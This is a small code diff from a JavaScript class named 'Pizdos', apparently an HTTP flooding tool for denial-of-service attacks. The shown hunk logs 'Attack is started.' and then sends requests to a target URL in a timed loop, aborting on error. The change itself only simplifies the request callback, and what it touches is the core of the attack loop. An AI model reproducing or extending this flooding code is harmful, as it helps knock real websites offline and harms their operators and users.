@@ -37,8 +37,8 @@ class Pizdos {
         console.log('Attack is started.')
 
         setInterval(() => {
-            request(url, (error, r, b) => {
-                if (!!error) {
+            request(url, (error) => {
+                if (error) {
                     console.log('Attack ended with an error.')
                     process.abort()
                 }
